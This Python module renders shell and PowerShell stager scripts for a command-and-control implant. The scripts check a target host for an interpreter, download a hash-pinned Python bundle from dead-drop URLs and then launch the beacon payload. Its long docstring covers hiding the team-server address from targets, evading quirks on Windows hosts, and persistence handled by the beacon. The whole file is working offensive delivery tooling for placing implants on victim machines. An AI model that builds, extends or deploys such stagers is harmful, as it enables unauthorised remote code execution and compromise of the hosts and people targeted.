#!/usr/bin/env python3
"""The stager: the artifact shape for a host with no usable interpreter.

The ordinary delivery is a one-liner, and a one-liner presupposes a
Python. This module fills the two templates beside it -- a POSIX shell
script and a PowerShell script -- which probe for an interpreter and,
**only** on finding none, walk an ordered list of locations until one
answers with the bytes its pinned hash names. "Optional" is therefore a
runtime property of the stager rather than a build flag: it brings an
interpreter when it finds nothing and not otherwise.

**Hash verification is mandatory and has no override.** There is no
argument here, no environment variable in the emitted text and no branch
in either template that unpacks or starts anything before a digest has
matched its pin. A host with no digest tool refuses rather than
proceeds, which is the same decision in the shape it is easiest to get
wrong. The reason is blunt: an unverified drop is remote code execution
in our own implant, and whoever can write to that location would own
every host staged from it.

**The drop list is ordered, and the team server is optional and last --
or absent.** With an external drop and a pinned hash the target speaks
only to a third party until the first check-in, so staging does not
expose the C2 address at all. An empty list is therefore supported and
renders the same script with nothing to walk: it probes, and refuses.
One script shape is one thing to keep correct, and the behaviour asked
for -- probe, then refuse -- is identical either way.

**Where the bundle lands, which is the detail that silently breaks.**
The zip `tools/build_interpreter_bundle.py` writes has exactly one
top-level directory and that directory *is* `base_dir`. So the stager
extracts into the **parent** of `<base>`; unpacking into `<base>` would
produce `<base>/<base>/python.exe`, and the startup hook -- which walks
up from its own `Lib/sitecustomize.py` -- would look for the payload one
directory too high and find nothing, with every file apparently in
place.

**What the stager does not do, and why that is not an omission.** It
installs no persistence. The per-build autorun name, the gate and the
payload name live in the build's `persistence` block and are acted on by
`Beacon._exec_persist`, which already removes exactly what it installed;
a second copy of that logic in two shell languages is a copy that would
drift. The stager's last act is to start the brought interpreter bare,
which is what runs the hook under either gate.

**The emitted text carries almost no comments.** It ships verbatim to a
target, so the reasons live in this docstring; see this package's own for
the rule. There are exactly two deliberate exceptions, and this list is
the whole of them. The refusal messages: a stager that gave up silently
is the shape in which this feature would die quietly on an engagement,
and no line of them names this project. And one comment in the
PowerShell template, on its probe, for the trap below.

**The trap on the Windows probe, which cannot be reproduced anywhere but
on a real Windows host.** In Windows PowerShell 5.1, a native command's
stderr lines are promoted to `NativeCommandError` records whenever
PowerShell captures that stderr, and under
`$ErrorActionPreference = 'Stop'` the first record throws. The probe
would read the throw as a failed version check -- so an interpreter at
or above the floor that printed a single warning line would be judged
unusable and a bundle fetched onto a host that already had a Python,
which is the one outcome probing first exists to prevent. There are
three triggers and they need both halves of one fix:

1. **This script redirecting stderr.** Any `2>` or `*>` on the
   invocation does it; `2>&1` and `2>$null` behave identically. Handled
   by not redirecting stderr at all -- only stdout goes to `$null`.
2. **The caller redirecting this script's stderr**, as in
   `powershell -File stager.ps1 2> log`.
3. **No console handle to inherit** -- ISE, WinRM, `Invoke-Command`,
   `Start-Process -RedirectStandardError`, or a C2 task that pipes both
   streams, **which is how this script normally arrives on a host**.

Nothing inside the script can stop 2 and 3 from capturing stderr, so for
those the verdict on the record is changed rather than the capture
prevented: `$ErrorActionPreference` is saved, set to `'Continue'` for the
invocation and the read of `$LASTEXITCODE`, and restored in a `finally`.
That window writes nothing, runs before any directory exists, and sits
inside a `catch` that already turns any failure into "unusable", so the
`'Stop'` that the layout's all-or-nothing behaviour depends on is never
absent from anything that could leave a partial layout.

**Why the proxy block in the Windows fetch has its own `try`/`catch`.**
Its caller turns a throw from the fetch into "try the next drop", so one
environment quirk in `GetSystemWebProxy` or `DefaultCredentials` would
otherwise cost the whole drop list rather than a single attempt. Caught
there, the request keeps whatever proxy it was given by default and the
fetch is still attempted. This reasoning is here rather than beside those
three lines because the list of comments in the emitted text is closed
above.
"""

import pathlib
import re

# The interpreter version a delivered artifact needs. It is not a taste:
# `software/c2/beacon.py` annotates with PEP 585 generics (`list[dict]`),
# which are evaluated when the module is imported, so the artifact does
# not merely misbehave below this floor -- it fails to start. Both
# templates ask the candidate interpreter itself through
# `sys.version_info` rather than parsing a `-V` banner.
MIN_PYTHON = (3, 9)

# The templates, by the `platform` argument that selects them.
_TEMPLATES = {"posix": "posix.sh.tmpl", "windows": "windows.ps1.tmpl"}

_HERE = pathlib.Path(__file__).resolve().parent

# `@@NAME@@` is not valid shell and not valid PowerShell, so a template
# whose placeholder was renamed fails loudly rather than rendering a
# script that carries the literal.
_PLACEHOLDER = re.compile(r"@@([A-Z_]+)@@")

_SHA256 = re.compile(r"^[0-9a-fA-F]{64}$")

# One plain path component, the same shape the generator mints and the
# bundle builder holds `base_dir` to. It becomes a directory name under
# the user's own tree and is interpolated into two shell languages, so a
# separator, a quote or a leading dot in it would put the layout
# somewhere nobody asked for.
_PLAIN_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")

# A location has to be fetchable by `curl` and by `HttpWebRequest`, and
# it is interpolated into a single-quoted string in both templates and
# read back by `read -r url sha` in one of them. Whitespace and quotes
# are refused rather than escaped: a URL needing either is a mistake
# upstream. The `https?` anchor is also what makes the PowerShell
# template's `[Net.HttpWebRequest]` cast of `[Net.WebRequest]::Create`
# safe -- another scheme would hand back a different WebRequest subclass
# and the cast would throw.
_URL = re.compile(r"^https?://[^\s'\"\\]+$")


def render_stager(platform: str, *, oneliner: str, drops, base_dir: str) -> str:
    """One stager for `platform`, ready to paste.

    `drops` is the ordered dead-drop list, `[{"url", "sha256"}]`, and may
    be empty. Every entry is refused unless its `sha256` is 64 hex digits
    and its `url` is an unambiguous `http(s)` location -- an entry that
    could not be verified must never become an entry that is fetched, so
    it is a refusal here rather than a decision taken on the target.

    `oneliner` is what the stager runs when the host already has a usable
    interpreter: the ordinary delivery, unmodified. `base_dir` is the
    build's generated layout directory, which is also the bundle's one
    top-level directory.
    """
    if platform not in _TEMPLATES:
        raise ValueError(
            "platform must be one of %s, not %r"
            % (", ".join(sorted(_TEMPLATES)), platform))
    if not _PLAIN_NAME.match(base_dir or ""):
        raise ValueError(
            "base_dir must be one plain directory name made of letters, "
            "digits, dot, dash and underscore, not %r: it is the bundle's "
            "only top-level directory and the stager writes it into the "
            "user's own tree" % (base_dir,))

    command = _check_oneliner(oneliner)
    entries = [_check_drop(index, drop) for index, drop in enumerate(drops or ())]

    if platform == "posix":
        rendered_drops = "\n".join("%s %s" % (url, digest)
                                   for url, digest in entries)
        quoted = command.replace("'", "'\\''")
    else:
        rendered_drops = "@(%s)" % (", ".join(
            "@{u='%s';h='%s'}" % (url, digest) for url, digest in entries),)
        quoted = command.replace("'", "''")

    return _fill(_TEMPLATES[platform], {
        "BASE_DIR": base_dir,
        "DROPS": rendered_drops,
        "ONELINER": quoted,
        "MIN_MAJOR": str(MIN_PYTHON[0]),
        "MIN_MINOR": str(MIN_PYTHON[1]),
    })


def drop_list(asked) -> list:
    """`asked` as a validated `[{"url", "sha256"}]`, or raise.

    Here as well as inside `render_stager` so a caller can refuse a drop
    list *before* it does anything it would have to undo. The generator
    uses that: it registers a tunnel credential on the way to building an
    artifact, and a 400 raised after the registration would leave a PSK
    in the store that no artifact holds.
    """
    if asked is None:
        return []
    if not isinstance(asked, (list, tuple)):
        raise ValueError(
            "drops must be a list of {\"url\", \"sha256\"} entries, not %s"
            % (type(asked).__name__,))
    normalised = []
    for index, drop in enumerate(asked):
        url, digest = _check_drop(index, drop)
        normalised.append({"url": url, "sha256": digest})
    return normalised


def _check_drop(index: int, drop):
    """One entry as `(url, sha256)`, lower-cased, or raise."""
    if not isinstance(drop, dict):
        raise ValueError(
            "drop %d must be a {\"url\", \"sha256\"} object, not %s"
            % (index, type(drop).__name__,))

    digest = str(drop.get("sha256") or "").strip()
    if not _SHA256.match(digest):
        raise ValueError(
            "drop %d has no usable sha256 (%r): every location is pinned "
            "by 64 hex digits and there is no way to skip the check, so an "
            "entry without one cannot be delivered"
            % (index, drop.get("sha256")))

    url = str(drop.get("url") or "").strip()
    if not _URL.match(url):
        raise ValueError(
            "drop %d has no usable url (%r): it must be one http or https "
            "location with no whitespace, quote or backslash in it"
            % (index, drop.get("url")))
    return url, digest.lower()


def _check_oneliner(oneliner: str) -> str:
    """The ordinary delivery, refused if it could not survive quoting."""
    if not isinstance(oneliner, str) or not oneliner.strip():
        raise ValueError(
            "oneliner must be the ordinary delivery command, not %r"
            % (oneliner,))
    for character in oneliner:
        if character in "\n\t":
            continue
        if ord(character) < 0x20 or ord(character) == 0x7F:
            raise ValueError(
                "oneliner carries the control character %r, which neither "
                "template can quote" % (character,))
    return oneliner


def _fill(name: str, values: dict) -> str:
    """The named template with every `@@PLACEHOLDER@@` substituted once.

    Substituted text is never re-scanned, so a value that happened to
    contain `@@SOMETHING@@` cannot become a placeholder. Both directions
    are checked: a placeholder with no value, and a value no placeholder
    asked for. Either means this module and the template beside it have
    drifted apart, and a stager rendered from a template nobody filled
    would carry the literal onto a host.
    """
    template = (_HERE / name).read_text(encoding="utf-8")

    seen = set()
    for match in _PLACEHOLDER.finditer(template):
        key = match.group(1)
        if key not in values:
            raise ValueError(
                "%s asks for @@%s@@, which this renderer does not supply"
                % (name, key))
        seen.add(key)

    missing = sorted(set(values) - seen)
    if missing:
        raise ValueError(
            "%s uses none of %s, so the rendered stager would not carry "
            "them" % (name, ", ".join(missing)))

    return _PLACEHOLDER.sub(lambda match: values[match.group(1)], template)
